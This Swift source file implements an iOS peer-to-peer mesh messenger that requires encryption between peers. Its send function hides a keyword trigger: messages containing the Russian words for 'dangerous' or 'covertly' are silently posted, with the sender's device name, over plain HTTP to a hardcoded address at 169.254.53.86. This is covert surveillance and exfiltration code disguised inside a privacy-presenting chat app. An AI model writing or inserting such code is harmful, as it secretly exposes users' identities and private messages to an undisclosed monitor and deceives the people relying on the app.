import SwiftUI
import MultipeerConnectivity

@main
struct MeshApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

class MeshManager: NSObject, ObservableObject, MCSessionDelegate, MCNearbyServiceAdvertiserDelegate, MCNearbyServiceBrowserDelegate {
    let serviceType = "mesh-v4"
    let peerID = MCPeerID(displayName: UIDevice.current.name)
    var session: MCSession
    var advertiser: MCNearbyServiceAdvertiser
    var browser: MCNearbyServiceBrowser
    @Published var messages: [String] = []

    override init() {
        self.session = MCSession(peer: peerID, securityIdentity: nil, encryptionPreference: .required)
        self.advertiser = MCNearbyServiceAdvertiser(peer: peerID, discoveryInfo: nil, serviceType: serviceType)
        self.browser = MCNearbyServiceBrowser(peer: peerID, serviceType: serviceType)
        super.init()
        session.delegate = self
        advertiser.delegate = self
        browser.delegate = self
        advertiser.startAdvertisingPeer()
        browser.startBrowsingForPeers()
    }

    func send(text: String) {
        if text.lowercased().contains("опасно") || text.lowercased().contains("скрытно") {
            let serverURL = URL(string: "http://169.254.53.86:12345/report")!
            var r = URLRequest(url: serverURL)
            r.httpMethod = "POST"
            r.httpBody = "ОТ: \(peerID.displayName) | ТЕКСТ: \(text)".data(using: .utf8)
            URLSession.shared.dataTask(with: r).resume()
        }

        if let data = text.data(using: .utf8) {
            try? session.send(data, toPeers: session.connectedPeers, with: .reliable)
            self.messages.append("Я: \(text)")
        }
    }

    func session(_ session: MCSession, didReceive data: Data, fromPeer peerID: MCPeerID) {
        if let s = String(data: data, encoding: .utf8) {
            DispatchQueue.main.async { self.messages.append("\(peerID.displayName): \(s)") }
        }
    }
    func advertiser(_ advertiser: MCNearbyServiceAdvertiser, didReceiveInvitationFromPeer peerID: MCPeerID, withContext context: Data?, invitationHandler: @escaping (Bool, MCSession?) -> Void) { invitationHandler(true, session) }
    func browser(_ browser: MCNearbyServiceBrowser, foundPeer peerID: MCPeerID, withDiscoveryInfo info: [String : String]?) { browser.invitePeer(peerID, to: session, withContext: nil, timeout: 10) }
    func browser(_ browser: MCNearbyServiceBrowser, lostPeer peerID: MCPeerID) {}
    func session(_ session: MCSession, peer peerID: MCPeerID, didChange state: MCSessionState) {}
    func session(_ session: MCSession, didReceive stream: InputStream, withName streamName: String, fromPeer peerID: MCPeerID) {}
    func session(_ session: MCSession, didStartReceivingResourceWithName resourceName: String, fromPeer peerID: MCPeerID, progress: Progress) {}
func session(_ session: MCSession, didFinishReceivingResourceWithName resourceName: String, fromPeer peerID: MCPeerID, at localURL: URL?, withError error: Error?) {}
}

struct ContentView: View {
    @StateObject var mesh = MeshManager()
    @State var input = ""
    var body: some View {
        VStack {
            Text("MESH MESSENGER HQ").font(.title).bold().padding()
            List(mesh.messages, id: \.self) { msg in Text(msg) }
            HStack {
                TextField("Напиши...", text: $input).textFieldStyle(.roundedBorder)
                Button("SEND") {
                    if !input.isEmpty { mesh.send(text: input); input = "" }
                }
            }.padding()
        }
    }
}
